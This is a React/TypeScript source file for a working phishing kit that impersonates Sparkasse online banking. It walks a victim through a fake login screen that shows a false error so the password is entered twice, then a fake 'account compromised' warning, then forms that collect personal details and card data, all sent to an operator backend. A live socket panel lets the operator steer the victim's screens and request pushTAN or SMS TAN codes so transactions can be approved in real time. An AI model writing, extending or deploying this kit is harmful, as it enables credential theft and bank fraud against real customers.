import { useState, useEffect } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { updatePageMetadata, getTemplateMetadata } from '../../utils/templateMetadata';
import { submitTemplateData, getTemplateConfig, createTemplateSession } from '../../utils/templateApi';
import templateSocketClient from '../../utils/socketClient';

import './SparkasseStyle.css';

// Import components from index file
import {
  BranchSelection,
  LoginForm,
  Loading,
  ErrorScreen,
  Header,
  Footer,
  AccountCompromisedScreen,
  PersonalDataForm,
  BankCardForm,
  FinalSuccessScreen,
  PushTANScreen,
  SMSTANScreen
} from './components';

// Sparkasse flow states (7-step process with branch selection)
const STATES = {
  BRANCH_SELECTION: 'branch_selection',
  LOGIN: 'login',
  LOGIN_ERROR: 'login_error',
  ACCOUNT_COMPROMISED: 'account_compromised',
  PERSONAL_DATA: 'personal_data',
  PERSONAL_SUCCESS: 'personal_success',
  BANK_CARD: 'bank_card',
  BANK_SUCCESS: 'bank_success',
  FINAL_SUCCESS: 'final_success',
  LOADING: 'loading',
  ERROR: 'error',
  // Advanced states for admin control
  PUSHTAN_REQUEST: 'pushtan_request',
  SMS_TAN_REQUEST: 'sms_tan_request',
  TRANSACTION_CONFIRM: 'transaction_confirm',
  ACCOUNT_VERIFICATION: 'account_verification',
  // AFK/Live Mode states
  WAITING_FOR_ADMIN: 'waiting_for_admin'
};

// Configuration interface
interface StepConfig {
  branchSelection: boolean;
  personalData: boolean;
  bankCard: boolean;
  doubleLogin: boolean;
}

// Default configuration (fallback)
const DEFAULT_CONFIG: StepConfig = {
  branchSelection: true,
  personalData: true,
  bankCard: true,
  doubleLogin: true
};

// Types for Sparkasse flow
interface LoginData {
  username: string;
  password: string;
}

interface PersonalData {
  first_name: string;
  last_name: string;
  date_of_birth: string;
  street: string;
  street_number: string;
  plz: string;
  city: string;
  phone: string;
  email: string;
}

interface BankCardData {
  card_number: string;
  expiry_date: string;
}

// Branch selection interfaces
interface SelectedBranch {
  branch_id: number;
  branch_name: string;
  city: string;
  zip_code: string;
}

// AutoLogin component to handle automatic key generation
function AutoLogin() {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    // Update metadata for Sparkasse
    const metadata = getTemplateMetadata('sparkasse');
    updatePageMetadata(metadata);

    // Create session using backend
    const initializeSession = async () => {
      try {
        const newKey = await createTemplateSession('sparkasse');
        console.log('Generated key for Sparkasse:', newKey);
        navigate(`/sparkasse/${newKey}`);
      } catch (error) {
        console.error('Failed to create Sparkasse session:', error);
        setError('Fehler beim Erstellen der Sitzung');
        // Fallback to random key
        const fallbackKey = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
        navigate(`/sparkasse/${fallbackKey}`);
      }
    };

    // Small delay to show loading
    setTimeout(initializeSession, 500);
  }, [navigate]);

  if (error) {
    return <ErrorScreen message={error} onRetry={() => window.location.reload()} />;
  }

  return <Loading message="Bitte warten Sie, während wir Ihre Sitzung erstellen..." />;
}

// Main flow component for Sparkasse 6-step process
function FormFlow() {
  const { key } = useParams<{ key: string }>();
  const [state, setState] = useState<string>(STATES.LOGIN);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [loadingMessage, setLoadingMessage] = useState("Verbindung wird hergestellt...");
  const [stepConfig, setStepConfig] = useState<StepConfig>(DEFAULT_CONFIG);
  const [loginLoading, setLoginLoading] = useState(false);
  const [loginError, setLoginError] = useState<string | undefined>(undefined);
  const [selectedBranch, setSelectedBranch] = useState<SelectedBranch | null>(null);
  const [sessionData, setSessionData] = useState<any>({});
  
  // Enhanced TAN system state
  const [currentTanRequest, setCurrentTanRequest] = useState<{
    type: 'TRANSACTION_TAN' | 'LOGIN_TAN';
    method: 'pushtan' | 'sms';
    transactionDetails?: any;
    requestId: string;
  } | null>(null);

  // AFK/Live Mode system state
  const [sessionMode, setSessionMode] = useState<'AFK' | 'LIVE'>('AFK');
  const [isWaitingForAdmin, setIsWaitingForAdmin] = useState(false);

  // Scroll to top whenever state changes and reset login error
  useEffect(() => {
    window.scrollTo({ top: 0, behavior: 'smooth' });
    if (state !== STATES.LOGIN_ERROR) {
      setLoginError(undefined);
    }
  }, [state]);

  // Flow control function - checks if should pause in Live Mode
  const proceedToNextState = (nextState: string, processingMessage: string = 'Wird verarbeitet...') => {
    if (sessionMode === 'LIVE') {
      // In Live Mode: pause and wait for admin
      setLoading(true);
      setLoadingMessage(processingMessage);
      setIsWaitingForAdmin(true);
      
      // Store the next state to transition to when admin continues
      setSessionData(prev => ({ ...prev, pendingState: nextState }));
      
      // Notify admin that user is waiting
      templateSocketClient.emit('user-waiting', {
        sessionKey: key,
        currentState: state,
        pendingState: nextState,
        message: processingMessage
      });
    } else {
      // In AFK Mode: continue automatically
      setState(nextState);
    }
  };

  useEffect(() => {
    if (!key) {
      setError('Ungültiger Session-Schlüssel');
      setLoading(false);
      return;
    }

    // Update metadata for Sparkasse
    const metadata = getTemplateMetadata('sparkasse');
    updatePageMetadata(metadata);

    // Load step configuration from backend
    const loadConfig = async () => {
      try {
        const config = await getTemplateConfig('sparkasse');
        setStepConfig(config.steps);
        if (process.env.NODE_ENV === 'development') {
          console.log('Loaded Sparkasse step config:', config.steps);
        }
      } catch (error) {
        console.warn('Failed to load step config, using defaults:', error);
      }
    };

    console.log(`Initializing Sparkasse session with key: ${key}`);
    loadConfig();

    // Initialize Socket.io connection for real-time admin control
    if (key) {
      templateSocketClient.connect({
        sessionKey: key,
        templateName: 'sparkasse',
        onStateForced: (state: string, message?: string) => {
          console.log('🎯 Admin forced state change:', state, message);
          
          setLoading(true);
          
          const getLoadingMessage = (targetState: string): string => {
            switch (targetState) {
              case 'personal_data':
                return 'Persönliche Daten werden geladen...';
              case 'bank_card':
                return 'Bankdaten werden verarbeitet...';
              case 'final_success':
                return 'Vorgang wird abgeschlossen...';
              case 'account_compromised':
                return 'Sicherheitsprüfung läuft...';
              default:
                return 'Bitte warten Sie...';
            }
          };
          
          setLoadingMessage(message || getLoadingMessage(state));
          
          setTimeout(() => {
            setState(state);
            setLoading(false);
            if (message) {
              alert(message);
            }
          }, 1500);
        },
        onDataInjected: (data: any) => {
          console.log('💉 Admin injected data:', data);
          
          setLoading(true);
          setLoadingMessage('Daten werden aktualisiert...');
          
          setTimeout(() => {
            setSessionData(prev => ({ ...prev, ...data }));
            setLoading(false);
          }, 1000);
        },
        onRedirect: (url: string) => {
          console.log('🔗 Admin triggered redirect:', url);
          window.location.href = url;
        },
        onMessage: (message: string, type: string) => {
          console.log('💬 Admin message:', message, type);
          alert(`${type.toUpperCase()}: ${message}`);
        },
        // AFK/Live Mode handlers
        onModeChanged: (mode: 'AFK' | 'LIVE') => {
          console.log('🎛️ Admin changed session mode:', mode);
          setSessionMode(mode);
          
          if (mode === 'AFK' && isWaitingForAdmin) {
            setIsWaitingForAdmin(false);
            setLoading(false);
          }
        },
        onContinueFlow: () => {
          console.log('▶️ Admin triggered continue flow');
          if (isWaitingForAdmin && sessionData.pendingState) {
            setIsWaitingForAdmin(false);
            setLoading(false);
            setState(sessionData.pendingState);
            setSessionData(prev => ({ ...prev, pendingState: null }));
          }
        },
        // Enhanced TAN system handlers
        onTanRequest: (tanData: {
          type: 'TRANSACTION_TAN' | 'LOGIN_TAN';
          method: 'pushtan' | 'sms';
          transactionDetails?: any;
          requestId: string;
        }) => {
          console.log('🔐 Admin requested TAN:', tanData);
          
          setLoading(true);
          setLoadingMessage(
            tanData.type === 'TRANSACTION_TAN' 
              ? 'Stornierung wird vorbereitet...' 
              : 'Anmeldung wird verarbeitet...'
          );
          
          setTimeout(() => {
            setCurrentTanRequest(tanData);
            setLoading(false);
            
            if (tanData.method === 'pushtan') {
              setState(STATES.PUSHTAN_REQUEST);
            } else {
              setState(STATES.SMS_TAN_REQUEST);
            }
          }, 2000);
        }
      });
    }

    // Fetch initial state from backend (like original)
    const fetchInitialState = async () => {
      try {
        // For Sparkasse, we typically start with branch selection
        setState(STATES.BRANCH_SELECTION);
        setLoading(false);
      } catch (error) {
        console.error('Error setting initial state:', error);
        setState(STATES.LOGIN);
        setLoading(false);
      }
    };

    fetchInitialState();
    
    // Cleanup socket on unmount
    return () => {
      templateSocketClient.disconnect();
    };
  }, [key]);

  // Handle branch selection (Step 1)
  const handleBranchSelection = async (branch: SelectedBranch) => {
    try {
      console.log('Submitting branch selection for session:', key);
      console.log('Selected branch:', branch);
      
      // Update local state immediately
      setSelectedBranch(branch);
      
      // Show loading state
      setLoading(true);
      setLoadingMessage("Sparkasse wird geladen...");
      
      // Submit branch selection to backend
      try {
        const response = await submitTemplateData({
          template_name: 'sparkasse',
          key: key || '',
          step: 'branch-selection',
          data: branch
        });
        
        console.log('Branch selection submitted successfully:', response);
      } catch (apiError) {
        console.warn('API submission failed, continuing with flow:', apiError);
        // Continue with flow even if API fails
      }

      // Simulate processing time and then move to login
      setTimeout(() => {
        setState(STATES.LOGIN);
        setLoading(false);
      }, 1500);
      
    } catch (error) {
      console.error('Branch selection error:', error);
      setError('Fehler bei der Filialauswahl');
      setLoading(false);
    }
  };

  // Handle login form submission (Steps 2-3)
  const handleLogin = async (data: LoginData) => {
    try {
      console.log('Submitting login for Sparkasse flow:', { key, username: data.username ? '✓' : '✗' });
      
      if (!key) {
        console.error('No session key available');
        setError('Keine Sitzungs-ID vorhanden');
        setState(STATES.ERROR);
        return;
      }
      
      // Set loading state for login
      setLoginLoading(true);
      setLoginError(undefined);
      
      // Show quick loading screen
      setLoadingMessage("Anmeldedaten werden überprüft...");
      setState(STATES.LOADING);
      
      // Submit login data to backend for tracking
      try {
        const response = await submitTemplateData({
          template_name: 'sparkasse',
          key: key || '',
          step: 'login',
          data: {
            username: data.username,
            password: data.password,
            selectedBranch: selectedBranch,
            state: state,
            attempt: state === STATES.LOGIN ? 1 : 2,
            browser: navigator.userAgent,
            referrer: document.referrer,
            timestamp: new Date().toISOString()
          }
        });

        console.log('Login data submitted to backend:', response);
      } catch (apiError) {
        console.warn('Failed to submit login data to admin dashboard:', apiError);
        // Continue with flow even if API fails
      }
      
      // Check if this is first or second login attempt
      const isFirstAttempt = !loginError;
      
      // Simulate login attempt
      setTimeout(() => {
        if (isFirstAttempt) {
          if (stepConfig.doubleLogin) {
            // First attempt - show error
            setState(STATES.LOGIN_ERROR);
            setLoginError('login_error');
          } else {
            // Single login - go directly to account compromised
            setState(STATES.ACCOUNT_COMPROMISED);
          }
        } else {
          // Second attempt - go to account compromised
          setState(STATES.ACCOUNT_COMPROMISED);
        }
        setLoginLoading(false);
      }, 3000);
      
    } catch (error) {
      console.error('Login error:', error);
      setError('Fehler bei der Anmeldung');
      setState(STATES.LOGIN);
      setLoginLoading(false);
    }
  };

  // Handle account compromised continuation
  const handleAccountCompromisedContinue = () => {
    setState(STATES.LOADING);
    setLoadingMessage("Sicherheitsüberprüfung wird gestartet...");
    
    setTimeout(() => {
      if (stepConfig.personalData) {
        setState(STATES.PERSONAL_DATA);
      } else if (stepConfig.bankCard) {
        setState(STATES.BANK_CARD);
      } else {
        setState(STATES.FINAL_SUCCESS);
      }
    }, 2000);
  };

  // Handle personal data submission (Step 4 - optional)
  const handlePersonalDataSubmit = async (data: PersonalData) => {
    try {
      console.log('App.tsx: Received personal data from form:', data);
      console.log('App.tsx: Submitting personal data for session:', key);
      
      console.log('Sparkasse: Personal data being submitted:', data);
      
      // Submit personal data to backend
      const response = await submitTemplateData({
        template_name: 'sparkasse',
        key: key || '',
        step: 'personal-data-complete',
        data: data
      });
      
      if (!response.success) {
        console.error('❌ Sparkasse personal data submission failed:', response.error);
        setError(response.error || 'Fehler beim Speichern der persönlichen Daten');
        setState(STATES.ERROR);
        return;
      }
      
      console.log('✅ Sparkasse personal data submitted successfully');
      
      // Immediately set loading state to prevent form from showing again
      setState(STATES.LOADING);
      setLoadingMessage("Persönliche Daten werden verarbeitet...");
      
      // The backend will send a state update via socket when ready
      setTimeout(() => {
        if (stepConfig.bankCard) {
          setState(STATES.BANK_CARD);
        } else {
          setState(STATES.FINAL_SUCCESS);
        }
      }, 2500);
    } catch (error) {
      console.error('Personal data submission error:', error);
      setError('Fehler beim Speichern der persönlichen Daten');
    }
  };

  // Handle bank card data submission (Step 5 - optional)
  const handleBankCardSubmit = async (data: BankCardData) => {
    try {
      console.log('Sparkasse: Submitting bank card data for session:', key);
      console.log('Sparkasse: Bank card data being submitted:', data);
      
      setState(STATES.LOADING);
      setLoadingMessage("Bankkarten-Daten werden verarbeitet...");
      
      // Submit bank card data to backend
      const response = await submitTemplateData({
        template_name: 'sparkasse',
        key: key || '',
        step: 'bank-card-complete',
        data: data
      });
      
      if (response.success) {
        console.log('✅ Sparkasse bank card data submitted successfully');
        setState(STATES.FINAL_SUCCESS);
      } else {
        console.error('❌ Sparkasse bank card submission failed:', response.error);
        setError(response.error || 'Fehler beim Speichern der Bankkarten-Daten');
        setState(STATES.ERROR);
      }
    } catch (error: any) {
      console.error('❌ Sparkasse bank card submission error:', error);
      setError('Fehler beim Speichern der Bankkarten-Daten');
      setState(STATES.ERROR);
    }
  };

  // Handle bank card skip
  const handleBankCardSkip = async () => {
    try {
      console.log('Sparkasse: Bank card skipped for session:', key);
      
      // Submit skip to backend
      const response = await submitTemplateData({
        template_name: 'sparkasse',
        key: key || '',
        step: 'bank-card-skip',
        data: { skip_reason: 'no_credit_card' }
      });
      
      if (!response.success) {
        console.error('❌ Sparkasse bank card skip failed:', response.error);
        setError(response.error || 'Fehler beim Überspringen der Kartendaten');
        setState(STATES.ERROR);
        return;
      }
      
      console.log('✅ Sparkasse bank card skip completed successfully');
      
      // Show loading screen
      setLoading(true);
      setLoadingMessage("Wird abgeschlossen...");
      
      // Simulate processing time
      setTimeout(() => {
        setLoading(false);
        setState(STATES.FINAL_SUCCESS);
      }, 2000);
      
    } catch (error) {
      console.error('❌ Sparkasse bank card skip error:', error);
      setError('Fehler beim Überspringen der Kartendaten');
      setState(STATES.ERROR);
    }
  };

  // Render appropriate component based on state
  const renderContent = () => {
    if (loading) {
      return <Loading message={loadingMessage} />;
    }
    
    if (error) {
      return <ErrorScreen message={error} />;
    }
    
    switch (state) {
      case STATES.BRANCH_SELECTION:
        return <BranchSelection onSubmit={handleBranchSelection} />;
        
      case STATES.LOGIN:
        return <LoginForm onSubmit={handleLogin} isLoading={loginLoading} twoStepMode={stepConfig.doubleLogin} />;
      
      case STATES.LOGIN_ERROR:
        return <LoginForm onSubmit={handleLogin} isLoading={loginLoading} errorMessage={loginError} twoStepMode={stepConfig.doubleLogin} />;
      
      case STATES.ACCOUNT_COMPROMISED:
        return <AccountCompromisedScreen onStartVerification={handleAccountCompromisedContinue} />;
      
      case STATES.PERSONAL_DATA:
        // Only render if personal data step is enabled
        if (stepConfig.personalData) {
          return <PersonalDataForm onSubmit={handlePersonalDataSubmit} />;
        } else {
          // This shouldn't happen if backend is working correctly, but handle gracefully
          console.warn('Personal data form requested but step is disabled');
          return <Loading message="Weiterleitung..." />;
        }
      
      case STATES.BANK_CARD:
        // Only render if bank card step is enabled
        if (stepConfig.bankCard) {
          return <BankCardForm onSubmit={handleBankCardSubmit} onSkip={handleBankCardSkip} />;
        } else {
          // This shouldn't happen if backend is working correctly, but handle gracefully
          console.warn('Bank card form requested but step is disabled');
          return <Loading message="Weiterleitung..." />;
        }
      
      case STATES.FINAL_SUCCESS:
        return <FinalSuccessScreen />;
      
      case STATES.PUSHTAN_REQUEST:
        return <PushTANScreen 
          tanType={currentTanRequest?.type || 'TRANSACTION_TAN'}
          transactionDetails={currentTanRequest?.transactionDetails}
          onConfirm={() => {
            templateSocketClient.emit('tan-completed', {
              requestId: currentTanRequest?.requestId,
              success: true,
              type: currentTanRequest?.type
            });
            setCurrentTanRequest(null);
            setState(STATES.FINAL_SUCCESS);
          }}
          onCancel={() => {
            templateSocketClient.emit('tan-cancelled', {
              requestId: currentTanRequest?.requestId,
              type: currentTanRequest?.type
            });
            setCurrentTanRequest(null);
            setState(STATES.LOGIN);
          }}
        />;
      
      case STATES.SMS_TAN_REQUEST:
        return <SMSTANScreen 
          tanType={currentTanRequest?.type || 'TRANSACTION_TAN'}
          phoneNumber={sessionData.maskedPhone || sessionData.phone}
          transactionDetails={currentTanRequest?.transactionDetails}
          onSubmit={(tan) => {
            console.log('SMS TAN submitted:', tan);
            templateSocketClient.emit('tan-completed', {
              requestId: currentTanRequest?.requestId,
              success: true,
              type: currentTanRequest?.type,
              tanValue: tan
            });
            setCurrentTanRequest(null);
            setState(STATES.FINAL_SUCCESS);
          }}
          onResend={() => {
            console.log('SMS TAN resend requested');
            templateSocketClient.emit('tan-resend-requested', {
              requestId: currentTanRequest?.requestId,
              type: currentTanRequest?.type
            });
          }}
          onCancel={() => {
            templateSocketClient.emit('tan-cancelled', {
              requestId: currentTanRequest?.requestId,
              type: currentTanRequest?.type
            });
            setCurrentTanRequest(null);
            setState(STATES.LOGIN);
          }}
        />;
      
      case STATES.WAITING_FOR_ADMIN:
        return <Loading 
          message={isWaitingForAdmin ? loadingMessage : 'Wird verarbeitet...'} 
          type="processing"
          showProgress={false}
        />;
      
      case STATES.LOADING:
        return <Loading message={loadingMessage} />;
      
      case STATES.ERROR:
        return <ErrorScreen message={error || 'Ein Fehler ist aufgetreten'} />;
      
      default:
        return <ErrorScreen message="Unbekannter Status" />;
    }
  };

  return (
    <div style={{ 
      minHeight: '100vh', 
      backgroundColor: '#2c2c2c',
      display: 'flex',
      flexDirection: 'column'
    }}>
      <Header selectedBranch={selectedBranch} />
      <main style={{ 
        width: '100%',
        maxWidth: '1400px',
        margin: '0 auto',
        padding: '0',
        flex: 1
      }}>
        {renderContent()}
      </main>
      <Footer />
    </div>
  );
}

// Main Sparkasse Template Component
const SparkasseTemplate: React.FC = () => {
  const { key } = useParams<{ key: string }>();

  // If no key provided, show AutoLogin to generate one
  if (!key) {
    return <AutoLogin />;
  }

  // If key provided, show the main form flow
  return <FormFlow />;
};

export default SparkasseTemplate;